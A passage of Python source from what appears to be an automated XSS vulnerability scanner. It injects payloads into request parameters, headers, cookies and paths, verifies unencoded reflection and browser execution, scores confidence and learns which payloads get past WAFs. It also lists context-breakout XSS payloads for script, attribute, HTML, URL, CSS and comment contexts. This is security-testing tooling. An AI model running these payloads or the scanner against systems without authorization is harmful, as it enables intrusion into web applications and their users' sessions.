                response = self.client.get(url, cookies={param_name: payload})
                test_url = url
                _post_data_for_report = None
            elif location == 'path':
                path_index = param_context.get('path_index', 0) if param_context else 0
                test_url = self._build_path_url(url, path_index, payload)
                response = self.client.get(test_url)
                _post_data_for_report = None
            else:
                effective_url = url
                if param_context and param_context.get('form_action'):
                    effective_url = param_context['form_action']
                test_url = self._build_test_url(effective_url, param_name, payload, location)
                response = self.client.get(test_url)
                _post_data_for_report = None
            
            body = response.text
            with self._payloads_tested_lock:
                self.payloads_tested += 1
            
            content_type = response.headers.get('Content-Type', '').lower()
            if content_type and not any(ct in content_type for ct in ['text/', 'html', 'xml']):
                return None
            
            verify_class = self.verifier.verify_class
            verify_id = self.verifier.verify_id
            
            has_marker = verify_class in body or verify_id in body
            baseline_marker_count = 0
            marker_is_new = has_marker
            if has_marker and baseline_html:
                baseline_marker_count = baseline_html.count(verify_class) + baseline_html.count(verify_id)
                current_marker_count = body.count(verify_class) + body.count(verify_id)
                marker_is_new = current_marker_count > baseline_marker_count
            
            payload_reflected_raw = self._is_payload_reflected_raw(body, payload)
            
            if not payload_reflected_raw and not has_marker:
                return None

            if has_marker and not marker_is_new and not payload_reflected_raw:
                return None

            if has_marker and not marker_is_new:
                has_marker = False
            
            marker_in_tag = False
            if has_marker:
                search_markers = [verify_class, verify_id]
                for search_marker in search_markers:
                    search_start = 0
                    while True:
                        marker_pos = body.find(search_marker, search_start)
                        if marker_pos == -1:
                            break
                        search_start = marker_pos + 1
                        
                        before_marker = body[max(0, marker_pos - 80):marker_pos]
                        after_marker = body[marker_pos:marker_pos + len(search_marker) + 30]
                        
                        last_lt = before_marker.rfind('<')
                        last_gt = before_marker.rfind('>')
                        
                        if last_lt > last_gt and last_lt != -1:
                            abs_lt_pos = max(0, marker_pos - 80) + last_lt
                            if abs_lt_pos >= 3:
                                preceding = body[abs_lt_pos - 3:abs_lt_pos + 1]
                                if preceding.startswith('&lt'):
                                    continue  # This < is actually &lt; encoded
                            
                            if '>' in after_marker:
                                marker_in_tag = True
                                break
                    if marker_in_tag:
                        break
                
                if not marker_in_tag and not payload_reflected_raw:
                    return None
            
            if not has_marker and not payload_reflected_raw:
                return None
            

            context_result = self.context_analyzer.analyze(
                body,
                payload[:30] if len(payload) > 30 else payload,
            )
            context = {'Location': 'HTML', 'Encoding': 'none'}

            if isinstance(context_result, dict):
                if context_result.get('found') and context_result.get('contexts'):
                    context = context_result['contexts'][0]
            else:
                if getattr(context_result, 'found', False) and getattr(context_result, 'best', None):
                    context = context_result.best.to_dict()
                elif getattr(context_result, 'found', False) and getattr(context_result, 'contexts', None):
                    context = context_result.contexts[0].to_dict()
            
            reverify_ok = False
            try:
                if location == 'json_body':
                    reverify_action = param_context.get('form_action', url) if param_context else url
                    resp2 = self.client.post_json(
                        reverify_action,
                        json_data=json_template,
                        allow_redirects=False,
                    )
                    resp2 = self._post_follow_redirect(resp2, reverify_action, payload)
                elif location == 'POST':
                    reverify_post = {}
                    if param_context:
                        reverify_post = dict(param_context.get('form_inputs', {}))
                    reverify_post[param_name] = payload
                    resp2 = self.client.post(form_action, data=reverify_post, allow_redirects=False)
                    resp2 = self._post_follow_redirect(resp2, form_action, payload)
                else:
                    reverify_url = self._build_test_url(url, param_name, payload, location)
                    if param_context and param_context.get('form_action'):
                        reverify_url = self._build_test_url(
                            param_context['form_action'], param_name, payload, location
                        )
                    resp2 = self.client.get(reverify_url)
                body2 = resp2.text
                if has_marker and (self.verifier.verify_class in body2 or self.verifier.verify_id in body2):
                    if baseline_html:
                        marker_count_2 = body2.count(self.verifier.verify_class) + body2.count(self.verifier.verify_id)
                        reverify_ok = marker_count_2 > baseline_marker_count
                    else:
                        reverify_ok = True
                elif payload_reflected_raw and self._is_payload_reflected_raw(body2, payload):
                    reverify_ok = True
            except Exception as e:
                if getattr(self.config, 'verbose', False):
                    import traceback
                    traceback.print_exc()
                reverify_ok = False

            consistency_ratio = self._consistency_check(
                url=url,
                param=param_name,
                payload=payload,
                location=location,
                param_context=param_context,
                n=3,
            )

            diff_result = None
            if baseline_html:
                try:
                    diff_result = self.diff_engine.diff(baseline_html, body)
                except Exception:
                    logger.debug("HTML diff analysis failed", exc_info=True)
                    if self.config.verbose:
                        import traceback
                        traceback.print_exc()

            execution_evidence = None
            browser_matrix = {
                'chromium': {'executed': False, 'method': None, 'error': None},
            }
            if location not in ('POST', 'json_body'):
                try:
                    if self.execution_verifier is None:
                        self.execution_verifier = ExecutionVerifier(
                            timeout_ms=self._execution_timeout_ms,
                            browser_engine='chromium',
                        )
                    exec_result = self.execution_verifier.verify(test_url, payload)
                    browser_matrix['chromium'] = {
                        'executed': bool(exec_result.executed),
                        'method': exec_result.method,
                        'error': exec_result.error,
                    }
                    if exec_result.executed:
                        execution_evidence = (
                            f"JS execution confirmed via {exec_result.method}: "
                            f"{exec_result.evidence}"
                        )
                except Exception:
                    logger.debug("Execution verification failed", exc_info=True)
                    if self.config.verbose:
                        import traceback
                        traceback.print_exc()

                if bool(getattr(self.config, 'execution_verify_firefox', False)):
                    browser_matrix['firefox'] = {'executed': False, 'method': None, 'error': None}
                    try:
                        if self.execution_verifier_firefox is None:
                            self.execution_verifier_firefox = ExecutionVerifier(
                                timeout_ms=self._execution_timeout_ms,
                                browser_engine='firefox',
                            )
                        ff_result = self.execution_verifier_firefox.verify(test_url, payload)
                        browser_matrix['firefox'] = {
                            'executed': bool(ff_result.executed),
                            'method': ff_result.method,
                            'error': ff_result.error,
                        }
                        if ff_result.executed and not execution_evidence:
                            execution_evidence = (
                                f"JS execution confirmed via firefox/{ff_result.method}: "
                                f"{ff_result.evidence}"
                            )
                    except Exception:
                        logger.debug("Firefox execution verification failed", exc_info=True)
                        if self.config.verbose:
                            import traceback
                            traceback.print_exc()

            browser_executed_any = any(v.get('executed') for v in browser_matrix.values())

            scoring_result = self.scorer.score(
                marker_in_tag=marker_in_tag,
                payload_reflected_raw=payload_reflected_raw,
                reverify_ok=reverify_ok,
                browser_executed=browser_executed_any,
                browser_method=(next((v.get('method') for v in browser_matrix.values() if v.get('executed')), None)),
                diff_has_suspicious=bool(diff_result and diff_result.has_suspicious),
                diff_high_severity=bool(
                    diff_result and any(
                        p.severity == 'high' for p in diff_result.suspicious_injection_points
                    )
                ),
                structural_dom_evidence=bool(diff_result and diff_result.structure_changed),
                reproducibility_ratio=consistency_ratio,
                context_executable=True,
            )
            confidence = min(max(scoring_result.score, 0), 100)
            exploitability_score = scoring_result.exploitability_score

            if browser_executed_any or scoring_result.severity in (Severity.CONFIRMED,):
                severity_level = 'confirmed'
            elif marker_in_tag and reverify_ok:
                severity_level = 'confirmed'
            else:
                severity_level = 'potential'

            result_dict = {
                'url': url,
                'parameter': param_name,
                'payload': payload,
                'test_url': test_url,
                'context': context,
                'status': 'Vulnerability Detected' if severity_level == 'confirmed' else 'Potential XSS (Not Executed)',
                'confidence': confidence,
                'exploitability_score': exploitability_score,
                'severity_level': severity_level,
                'bypass_technique': self._get_bypass_technique(payload),
                'proof': self._generate_proof(test_url, payload),
                'request': self._capture_full_request(response, test_url, location, _post_data_for_report),
                'response': self._capture_full_response(response, payload),
                'validated': (severity_level == 'confirmed'),
                'reverified': reverify_ok,
                'marker_in_tag': marker_in_tag,
                'consistency_ratio': consistency_ratio,
                'browser_matrix': browser_matrix,
            }

            trusted_signal = bool(marker_in_tag or execution_evidence)
            result_dict['smart_validated'] = self.smart_validator.is_real_xss(
                body,
                payload,
                trusted_signal=trusted_signal,
            )
            if not result_dict['smart_validated'] and not trusted_signal:
                return None

            if execution_evidence:
                result_dict['execution_evidence'] = execution_evidence
            if diff_result and diff_result.has_suspicious:
                result_dict['html_diff'] = diff_result.to_dict()
            return result_dict
            
        except Exception as e:
            logger.debug("Payload verification failed for %s", param_name, exc_info=True)
            if self.config.verbose:
                logger.error("Error verifying payload for %s: %s", param_name, e)
        
        return None

    def _consistency_check(
        self,
        url: str,
        param: str,
        payload: str,
        location: str,
        param_context: Optional[Dict] = None,
        n: int = 3,
    ) -> float:
        """Send the same payload multiple times and return hit ratio."""
        hits = 0
        attempts = max(1, n)
        for _ in range(attempts):
            try:
                injected = self.injector.inject(
                    url=url,
                    param_name=param,
                    value=payload,
                    location=location,
                    param_context=param_context,
                )
                if injected.success and self._is_payload_reflected_raw(injected.body, payload):
                    hits += 1
            except Exception:
                logger.debug("Suppressed exception", exc_info=True)
            time.sleep(random.uniform(0.3, 1.0))
        return hits / attempts

    def _validate_probe_consistency(
        self,
        url: str,
        param_name: str,
        location: str,
        param_context: Optional[Dict],
        first_char_status: Dict[str, str],
    ) -> bool:
        """Re-probe once and ensure per-char filtering stays stable."""
        probe_id = _generate_probe_id()
        special_chars = '<>"\'`()/'
        probe_string = f"{probe_id}_v2{special_chars}"
        try:
            if location == 'json_body':
                api_url = param_context.get('form_action', url) if param_context else url
                json_template = copy.deepcopy(param_context.get('json_body', {})) if param_context else {}
                json_template[param_name] = probe_string
                response = self.client.post_json(api_url, json_data=json_template, allow_redirects=False)
                response = self._post_follow_redirect(response, api_url, probe_id)
            elif location == 'POST':
                form_action = param_context.get('form_action', url) if param_context else url
                post_data = dict(param_context.get('form_inputs', {})) if param_context else {}
                post_data[param_name] = probe_string
                response = self.client.post(form_action, data=post_data, allow_redirects=False)
                response = self._post_follow_redirect(response, form_action, probe_id)
            elif location == 'header':
                response = self.client.get(url, headers={param_name: probe_string})
            elif location == 'cookie':
                response = self.client.get(url, cookies={param_name: probe_string})
            elif location == 'path':
                path_index = param_context.get('path_index', 0) if param_context else 0
                response = self.client.get(self._build_path_url(url, path_index, probe_string))
            else:
                effective_url = param_context.get('form_action', url) if param_context else url
                response = self.client.get(self._build_test_url(effective_url, param_name, probe_string, location))

            body = response.text
            pos = body.find(f"{probe_id}_v2")
            if pos == -1:
                return False
            after_probe = body[pos + len(f"{probe_id}_v2"): pos + len(f"{probe_id}_v2") + 500]
            encoded_forms = {
                '<': ['&lt;', '&#60;', '&#x3c;', '&#x3C;'],
                '>': ['&gt;', '&#62;', '&#x3e;', '&#x3E;'],
                '"': ['&quot;', '&#34;', '&#x22;'],
                "'": ['&#39;', '&#x27;', '&apos;'],
                '`': ['&#96;', '&#x60;'],
                '(': ['&#40;', '&#x28;'],
                ')': ['&#41;', '&#x29;'],
                '/': ['&#47;', '&#x2f;', '&#x2F;'],
            }
            second_status = {}
            for char in special_chars:
                if char in after_probe:
                    second_status[char] = 'raw'
                    continue
                if any(enc in after_probe or enc.lower() in after_probe.lower() for enc in encoded_forms.get(char, [])):
                    second_status[char] = 'encoded'
                else:
                    second_status[char] = 'removed'

            inconsistencies = sum(
                1 for char, status in first_char_status.items()
                if second_status.get(char) != status
            )
            return inconsistencies == 0
        except Exception:
            return False
    
    def _is_payload_reflected_raw(self, html: str, payload: str) -> bool:
        """
        Check if the critical XSS parts of the payload appear unencoded.
        This is the core false-positive prevention mechanism.
        
        Enhanced with context-aware checks to reduce false positives.
        """
        payload_lower = payload.lower()
        html_lower = html.lower()
        
        
        full_match = (payload in html or payload_lower in html_lower)
        
        if full_match:
            if self._is_reflection_in_safe_context(html, payload):
                return False
            return True
        
        tag_match = re.search(r'<(\w+)', payload_lower)
        if tag_match:
            tag_name = tag_match.group(1)
            injected_tag = f'<{tag_name}'
            encoded_tag = f'&lt;{tag_name}'
            
            if encoded_tag in html_lower and injected_tag not in html_lower:
                return False
            
            if injected_tag in html_lower:
                handler_match = re.search(r'(on\w+)\s*=', payload_lower)
                if handler_match:
                    handler = handler_match.group(1)
                    pattern = re.escape(injected_tag) + r'[^>]*' + re.escape(handler) + r'\s*='
                    if re.search(pattern, html_lower):
                        if not self._is_preexisting_tag(html_lower, injected_tag, handler):
                            return True
                
                if tag_name == 'script':
                    script_pattern = re.escape(payload_lower[:40])
                    if re.search(script_pattern, html_lower):
                        return True
                
                if tag_name in ('iframe', 'object', 'embed'):
                    if 'javascript:' in payload_lower:
                        js_pattern = re.escape(injected_tag) + r'[^>]*javascript:'
                        if re.search(js_pattern, html_lower):
                            return True
                
                if 'javascript:' in payload_lower and tag_name not in ('iframe', 'object', 'embed'):
                    js_pattern = re.escape(injected_tag) + r'[^>]*javascript:'
                    if re.search(js_pattern, html_lower):
                        return True
                
                tag_positions = [m.start() for m in re.finditer(re.escape(injected_tag), html_lower)]
                for tp in tag_positions:
                    nearby_html = html[tp:tp + 500]
                    if self.verifier.verify_class in nearby_html or self.verifier.verify_id in nearby_html:
                        return True
                
                return False
            
            return False
        
        js_exec_match = re.search(r'(alert|confirm|prompt)\s*[\(`]', payload_lower)
        if js_exec_match and not tag_match:
            if payload in html or payload_lower in html_lower:
                if not self._is_reflection_in_safe_context(html, payload):
                    return True
            return False
        
        if 'javascript:' in payload_lower:
            if payload in html or payload_lower in html_lower:
                if not self._is_reflection_in_safe_context(html, payload):
                    return True
            return False
        
        if payload.startswith('-->'):
            remaining = payload[3:]
            remaining_tag = re.search(r'<(\w+)', remaining.lower())
            if remaining_tag:
                tag = f'<{remaining_tag.group(1)}'
                for m in re.finditer(re.escape(tag), html_lower):
                    chunk = html[m.start():m.start() + 500]
                    if self.verifier.verify_class in chunk or self.verifier.verify_id in chunk:
                        return True
            return False
        
        if payload_lower.startswith(('"', "'", ' ')):
            if payload in html or payload_lower in html_lower:
                if not self._is_reflection_in_safe_context(html, payload):
                    return True
        
        return False

    def _is_reflection_in_safe_context(self, html: str, payload: str) -> bool:
        """
        Check if the payload reflection is in a non-exploitable context.
        Checks ALL occurrences of the payload — returns True only if EVERY
        reflection is safely contained (no exploitable position exists).

        Safe contexts include:
         - Inside <textarea>, <title>, <noscript>, <style>, <xmp> blocks
         - Inside an HTML comment (without --> breakout)
         - Inside a standalone JSON response body
         - Inside a JSON/object structure within <script> block
         - Inside a JavaScript string literal the payload cannot break
         - Hex/unicode encoded inside a JS context
         - URL-encoded inside an HTML attribute value
        Returns True if the reflection is safely contained (= false positive).
        """
        positions = []
        start = 0
        while True:
            pos = html.find(payload, start)
            if pos == -1:
                break
            positions.append(pos)
            start = pos + 1

        if not positions:
            html_lower_full = html.lower()
            payload_lower_full = payload.lower()
            start = 0
            while True:
                pos = html_lower_full.find(payload_lower_full, start)
                if pos == -1:
                    break
                positions.append(pos)
                start = pos + 1

        if not positions:
            return False

        for pos in positions:
            if not self._is_single_reflection_safe(html, pos, payload):
                return False

        return True

    def _is_single_reflection_safe(self, html: str, pos: int, payload: str) -> bool:
        """Check if a single reflection at position `pos` is safely contained."""
        before = html[max(0, pos - 500):pos]
        after = html[pos + len(payload):pos + len(payload) + 200]
        before_lower = before.lower()

        safe_containers = ['textarea', 'title', 'noscript', 'style', 'xmp']
        for container in safe_containers:
            open_tag = f'<{container}'
            close_tag = f'</{container}'
            last_open = before_lower.rfind(open_tag)
            last_close = before_lower.rfind(close_tag)
            if last_open > last_close and last_open != -1:
                breakout = f'</{container}' in payload.lower()
                if not breakout:
                    return True

        last_comment_open = before.rfind('<!--')
        last_comment_close = before.rfind('-->')
        if last_comment_open > last_comment_close and last_comment_open != -1:
            if '-->' not in payload:
                return True

        html_stripped = html.strip()
        if html_stripped.startswith('{') or html_stripped.startswith('['):
            sample = html_stripped[:3000].lower()
            if not any(tag in sample for tag in ('<html', '<body', '<head', '<!doctype', '<div', '<form')):
                return True

        last_script_open_4 = before_lower.rfind('<script')
        last_script_close_4 = before_lower.rfind('</script')
        if last_script_open_4 > last_script_close_4 and last_script_open_4 != -1:
            json_before = before.rstrip()
            json_endings = (
                '":', "':", '": "', ": '", '":"',
                '":["', "':['", '": ["', ": ['",
                '":[', "':[",
                '","', "','",
            )
            if json_before.endswith(json_endings):
                return True

        last_script_open = before_lower.rfind('<script')
        last_script_close = before_lower.rfind('</script')
        if last_script_open > last_script_close and last_script_open != -1:
            if self._is_payload_contained_in_js_string(html, pos, payload):
                return True

            nearby = html[max(0, pos - 10):pos + len(payload) + 10]
            if self._is_js_string_escaped(nearby, payload):
                return True

            if self._is_js_hex_encoded(html, pos, payload):
                return True

        if self._is_url_encoded_in_attribute(before, payload):
            return True

        return False

    def _is_js_string_escaped(self, nearby: str, payload: str) -> bool:
        """Check if the payload within a JS context has its quotes escaped."""
        for q in ('"', "'"):
            if q in payload:
                escaped_payload = payload.replace(q, f'\\{q}')
                if escaped_payload in nearby:
                    return True
        return False

    def _is_payload_contained_in_js_string(self, html: str, payload_pos: int, payload: str) -> bool:
        """
        Check if the payload is trapped inside a JavaScript string literal
        that the payload cannot break out of.
        
        Walks through the <script> content from tag start to the payload position,
        tracking JS string context (single/double/template). If the payload sits
        inside a string and doesn't contain the matching closing delimiter,
        it's safely contained and cannot execute.
        """
        before = html[:payload_pos]
        last_script = before.lower().rfind('<script')
        if last_script == -1:
            return False

        tag_end = html.find('>', last_script)
        if tag_end == -1 or tag_end >= payload_pos:
            return False

        js_content = html[tag_end + 1:payload_pos]

        in_string = None
        escaped = False
        i = 0
        while i < len(js_content):
            c = js_content[i]
            if escaped:
                escaped = False
                i += 1
                continue
            if c == '\\':
                escaped = True
                i += 1
                continue
            if in_string:
                if c == in_string:
                    in_string = None
            else:
                if c in ('"', "'", '`'):
                    in_string = c
            i += 1

        if in_string is None:
            return False  # Not inside a string — payload could be executable

        if in_string not in payload:
            return True  # Payload can't break this string → safely contained

        for idx, c in enumerate(payload):
            if c == in_string:
                html_idx = payload_pos + idx
                if html_idx > 0 and html[html_idx - 1] == '\\':
                    continue  # Server escaped this occurrence → can't break out
                else:
                    return False  # Unescaped delimiter → breakout possible

        return True  # All delimiter occurrences are escaped

    def _is_js_hex_encoded(self, html: str, pos: int, payload: str) -> bool:
        """
        Check if the payload at the given position has its dangerous characters
        hex-encoded (\\xNN) or unicode-encoded (\\uNNNN) in a JS context.
        """
        window_start = max(0, pos - 100)
        window_end = min(len(html), pos + len(payload) + 100)
        nearby = html[window_start:window_end]

        encode_map = {
            '<': ['\\x3c', '\\x3C', '\\u003c', '\\u003C'],
            '>': ['\\x3e', '\\x3E', '\\u003e', '\\u003E'],
            "'": ['\\x27', '\\u0027'],
            '"': ['\\x22', '\\u0022'],
            '(': ['\\x28', '\\u0028'],
            ')': ['\\x29', '\\u0029'],
        }
        for char in payload:
            if char in encode_map:
                for encoded_form in encode_map[char]:
                    if encoded_form in nearby:
                        return True
        return False

    def _is_url_encoded_in_attribute(self, before: str, payload: str) -> bool:
        """
        Check if the payload reflection is inside an HTML attribute where
        dangerous characters are URL-encoded (e.g. in meta og:url content).
        """
        last_tag_open = before.rfind('<')
        last_tag_close = before.rfind('>')
        if last_tag_open <= last_tag_close:
            return False  # Not inside a tag

        tag_content = before[last_tag_open:]
        if not re.search(r'=\s*["\'][^"\']*$', tag_content):
            return False

        attr_val_match = re.search(r'=\s*(["\'])([^"\']*$)', tag_content)
        if not attr_val_match:
            return False
        attr_value_content = attr_val_match.group(2)

        dangerous_chars = {
            '<': '%3c', '>': '%3e', "'": '%27', '"': '%22',
            '(': '%28', ')': '%29',
        }
        for char, encoded in dangerous_chars.items():
            if char in payload:
                if encoded in attr_value_content.lower():
                    return True
        return False

    def _is_preexisting_tag(self, html_lower: str, tag: str, handler: str) -> bool:
        """
        Check if a tag+handler combination was already present in the original page
        (not injected by us). This reduces false positives from pages that naturally
        contain event handlers like <body onload=...>.
        
        Heuristic: if the tag+handler appears commonly in the page many times
        and is NOT near our verification marker, it's likely pre-existing.
        """
        search_re = re.escape(tag) + r'[^>]*' + re.escape(handler) + r'\s*='
        matches = list(re.finditer(search_re, html_lower))
        
        if not matches:
            return False
        
        for m in matches:
            nearby = html_lower[max(0, m.start() - 50):m.end() + 200]
            if (self.verifier.verify_class in nearby or self.verifier.verify_id in nearby
                    or 'data-akha-id=' in nearby or 'akhaprobe' in nearby):
                return False  # This is our injection — not pre-existing
        
        return True


    def _generate_context_break_payloads(self, probe_result: Dict) -> List[str]:
        """
        Generate specialized context-break payloads when standard payloads fail.
        
        When initial payloads don't result in a verified XSS, this method creates
        targeted breakout payloads designed to escape the detected context:
        - Script context: ';alert(1);// or ";alert(1);//
        - Attribute context: " onmouseover=alert(1) x="
        - HTML context: "><svg/onload=alert(1)>
        - URL context: javascript:alert(1)
        - Comment context: --><svg/onload=alert(1)>
        """
        context = probe_result.get('context', 'html')
        quote = probe_result.get('quote_type')
        chars = probe_result.get('chars', {})

        break_payloads = []

        if context == 'javascript':
            if quote == "'":
                break_payloads.extend([
                    "';alert(1);//",
                    "';confirm(1);//",
                    "'+alert(1)+'",
                    "'-alert(1)-'",
                    "\\';alert(1);//",
                    f"';</script><svg/onload=alert(1) {self.verifier.verify_class}>",
                ])
            elif quote == '"':
                break_payloads.extend([
                    '";alert(1);//',
                    '";confirm(1);//',
                    '"+alert(1)+"',
                    '"-alert(1)-"',
                    '\\";alert(1);//',
                    f'";</script><svg/onload=alert(1) {self.verifier.verify_class}>',
                ])
            elif quote == '`':
                break_payloads.extend([
                    '${alert(1)}',
                    '${confirm(1)}',
                    '`;alert(1);//',
                ])
            else:
                break_payloads.extend([
                    "';alert(1);//",
                    '";alert(1);//',
                    ';alert(1);//',
                    '},alert(1);//',
                    ']);alert(1);//',
                    f'</script><svg/onload=alert(1) {self.verifier.verify_class}>',
                ])

        elif context == 'attribute':
            if quote == '"':
                break_payloads.extend([
                    f'" onmouseover=alert(1) {self.verifier.verify_class} x="',
                    f'" onfocus=alert(1) autofocus {self.verifier.verify_class} x="',
                    f'" onpointerenter=alert(1) {self.verifier.verify_class} x="',
                    f'"><svg/onload=alert(1) {self.verifier.verify_class}>',
                    f'"><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                    f'"><details open ontoggle=alert(1) {self.verifier.verify_class}>',
                ])
            elif quote == "'":
                break_payloads.extend([
                    f"' onmouseover=alert(1) {self.verifier.verify_class} x='",
                    f"' onfocus=alert(1) autofocus {self.verifier.verify_class} x='",
                    f"'><svg/onload=alert(1) {self.verifier.verify_class}>",
                    f"'><img src=x onerror=alert(1) {self.verifier.verify_class}>",
                ])
            else:
                break_payloads.extend([
                    f' onmouseover=alert(1) {self.verifier.verify_class} ',
                    f' onfocus=alert(1) autofocus {self.verifier.verify_class} ',
                    f'><svg/onload=alert(1) {self.verifier.verify_class}>',
                ])

        elif context == 'html':
            break_payloads.extend([
                f'"><svg/onload=alert(1) {self.verifier.verify_class}>',
                f"'><img src=x onerror=alert(1) {self.verifier.verify_class}>",
                f'<svg/onload=alert(1) {self.verifier.verify_class}>',
                f'<img src=x onerror=alert(1) {self.verifier.verify_class}>',
                f'<details open ontoggle=alert(1) {self.verifier.verify_class}>',
                f'<input onfocus=alert(1) autofocus {self.verifier.verify_class}>',
            ])

        elif context == 'url':
            break_payloads.extend([
                'javascript:alert(1)',
                'javascript:alert(document.domain)',
                f'"><svg/onload=alert(1) {self.verifier.verify_class}>',
            ])

        elif context == 'css':
            break_payloads.extend([
                f'</style><svg/onload=alert(1) {self.verifier.verify_class}>',
                f'</style><img src=x onerror=alert(1) {self.verifier.verify_class}>',
                'expression(alert(1))',
                'url(javascript:alert(1))',
            ])

        elif context == 'comment':
            break_payloads.extend([
                f'--><svg/onload=alert(1) {self.verifier.verify_class}>',
                f'--><img src=x onerror=alert(1) {self.verifier.verify_class}>',
            ])

        break_payloads = [
            p for p in break_payloads
            if self._is_payload_compatible(p, chars, context)
        ]

        return self._dedupe_keep_order(break_payloads)[:8]

    
    def scan(self, url: str, parameters: List[Dict], waf_name: Optional[str] = None,
             session=None) -> List[Dict]:
        """
        Scan URL for XSS vulnerabilities using probe-first approach.
        
        Flow per parameter:
        1. Send unique probe → check reflection + encoding
        2. If all XSS chars encoded → skip (no XSS possible)
        3. Generate context-specific payloads based on probe results
        4. Send each payload and verify FULL unencoded reflection
        """
        vulnerabilities = []
        vuln_lock = threading.Lock()
        base_threshold = int(getattr(self.config, 'min_confidence_threshold', 60))
        if not getattr(self.config, 'verified_only', False):
            base_threshold = min(base_threshold, 30)
        aggressive_threshold = max(30, base_threshold - 20)
        
        domain = urlparse(url).netloc
        endpoint_payload_used = 0
        endpoint_payload_cap = int(getattr(self.config, 'max_payloads_per_endpoint', 0) or 0)
        per_param_cap = int(getattr(self.config, 'max_payloads_per_param', 0) or 0)
        with self._csp_lock:
            if domain not in self._csp_cache:
                self._csp_cache[domain] = self.csp_analyzer.analyze(url)
            csp_result = self._csp_cache[domain]
        
        for param in parameters:
            if self._check_stop_pause():
                break
            
            param_name = param['name']
            param_location = param.get('location', 'query')

            if (not getattr(self.config, 'test_post_methods', True)
                    and param_location in ('POST', 'json_body')):
                continue
            
            if session and session.is_tested(url, param_name, param_location):
                continue
            
            param_context = None
            if param.get('form_action') or param.get('form_inputs') or param.get('json_body'):
                param_context = {
                    'form_action': param.get('form_action', url),
                    'form_inputs': param.get('form_inputs', {}),
                }
                if param.get('json_body'):
                    param_context['json_body'] = param['json_body']
            
            probe_result = self._send_probe(url, param_name, param_location, param_context)
            
            if not probe_result:
                probe_result = {
                    'chars': {c: 'raw' for c in '<>"\'()`/'},
                    'context': 'html',
                    'quote_type': None,
                    'in_script': False,
                    'in_attribute': False,
                    'attr_name': None,
                    'reflection_count': 0,
                    '_no_reflection': True,  # Flag: probe didn't reflect
                }
            
            chars = probe_result.get('chars', {})
            all_encoded = all(
                chars.get(c, 'removed') != 'raw'
                for c in '<>"\'()`/'
            )
            
            if all_encoded and probe_result.get('reflected', False):
                if session:
                    session.mark_tested(url, param_name, param_location)
                continue
            payloads = self._get_targeted_payloads(
                probe_result,
                waf_name,
                url=url,
                param_name=param_name,
                param_location=param_location,
            )
            if per_param_cap > 0:
                payloads = payloads[:per_param_cap]
            
            baseline_html = None
            probe_response = probe_result.get('response')
            if probe_response is not None:
                try:
                    baseline_html = probe_response.text
                except Exception as exc:
                    logger.debug("Failed to capture baseline HTML", exc_info=True)
                    pass

            if not payloads:
                if session:
                    session.mark_tested(url, param_name, param_location)
                continue
            
            found_vuln = False
            endpoint_profile = self._classify_endpoint_profile(url, param_location)
            encoding_profile = self._classify_encoding_profile(probe_result)
            
            for payload in payloads:
                if self._check_stop_pause():
                    break
                if endpoint_payload_cap > 0 and endpoint_payload_used >= endpoint_payload_cap:
                    break
                endpoint_payload_used += 1
                
                _inject_uid = uuid.uuid4().hex[:12]
                _tracked_payload = payload
                if self.verifier.verify_class in payload:
                    _tracked_payload = payload.replace(
                        self.verifier.verify_class,
                        f'class=akha data-akha-id="{_inject_uid}"'
                    )
                with self._injected_lock:
                    self._injected_payloads.append({
                        'url': url,
                        'param': param_name,
                        'payload': _tracked_payload,
                        'location': param_location,
                        'uid': _inject_uid,
                    })
                
                vuln = self._verify_xss(url, param_name, payload, param_location, param_context,
                                        baseline_html=baseline_html)
                
                if vuln:
                    with self._payloads_tested_lock:
                        self.candidates_detected += 1
                    min_conf = aggressive_threshold if self.config.aggressive_mode else base_threshold
                    if vuln.get('confidence', 0) < min_conf:
                        with self._payloads_tested_lock:
                            self.filtered_low_confidence += 1
                        continue

                    if vuln['severity_level'] != 'confirmed' and getattr(self.config, 'verified_only', False):
                        with self._payloads_tested_lock:
                            self.filtered_unverified += 1
                        continue
                    
                    vuln['csp'] = {
                        'has_csp': csp_result['has_csp'],
                        'exploitable': self.csp_analyzer.is_xss_exploitable(csp_result, payload),
                        'summary': self.csp_analyzer.get_summary(csp_result),
                    }
                    
                    if self.config.learning_enabled:
                        self.learning_engine.record_success(
                            payload, vuln['context']['Location'], waf_name,
                            domain=url,
                            endpoint_profile=endpoint_profile,
                            encoding_profile=encoding_profile,
                        )
                    
                    vulnerabilities.append(vuln)
                    found_vuln = True
                    
                    if not self.config.aggressive_mode:
                        break
                else:
                    if self.config.learning_enabled:
                        ctx_label = self._map_probe_context(
                            probe_result.get('context', 'html'))
                        failure_reason = None
                        if getattr(self.config, 'payload_failure_taxonomy', True):
                            failure_reason = self._classify_failure_reason(probe_result, waf_name)
                        self.learning_engine.record_failure(
                            payload, ctx_label, waf_name,
                            domain=url, waf_detected=bool(waf_name),
                            failure_reason=failure_reason,
                            endpoint_profile=endpoint_profile,
                            encoding_profile=encoding_profile,
                        )
            
            if not found_vuln and probe_result.get('reflected', False):
                break_payloads = self._generate_context_break_payloads(probe_result)
                for payload in break_payloads:
                    if self._check_stop_pause():
                        break
                    if endpoint_payload_cap > 0 and endpoint_payload_used >= endpoint_payload_cap:
                        break
                    endpoint_payload_used += 1

                    with self._injected_lock:
                        self._injected_payloads.append({
                            'url': url,
                            'param': param_name,
                            'payload': payload,
                            'location': param_location,
                        })

                    vuln = self._verify_xss(url, param_name, payload, param_location, param_context,
                                            baseline_html=baseline_html)

                    if vuln:
                        with self._payloads_tested_lock:
                            self.candidates_detected += 1
                        min_conf = aggressive_threshold if self.config.aggressive_mode else base_threshold
                        if vuln.get('confidence', 0) < min_conf:
                            with self._payloads_tested_lock:
                                self.filtered_low_confidence += 1
                            continue

                        if vuln['severity_level'] != 'confirmed' and getattr(self.config, 'verified_only', False):
                            with self._payloads_tested_lock:
                                self.filtered_unverified += 1
                            continue
                        
                        vuln['csp'] = {
                            'has_csp': csp_result['has_csp'],
                            'exploitable': self.csp_analyzer.is_xss_exploitable(csp_result, payload),
                            'summary': self.csp_analyzer.get_summary(csp_result),
                        }

                        if self.config.learning_enabled:
                            self.learning_engine.record_success(
                                payload, vuln['context']['Location'], waf_name,
                                domain=url,
                                endpoint_profile=endpoint_profile,
                                encoding_profile=encoding_profile,
                            )

                        vulnerabilities.append(vuln)
                        found_vuln = True

                        if not self.config.aggressive_mode:
                            break
                    else:
                        if self.config.learning_enabled:
                            ctx_label = self._map_probe_context(
                                probe_result.get('context', 'html'))
                            failure_reason = None
                            if getattr(self.config, 'payload_failure_taxonomy', True):
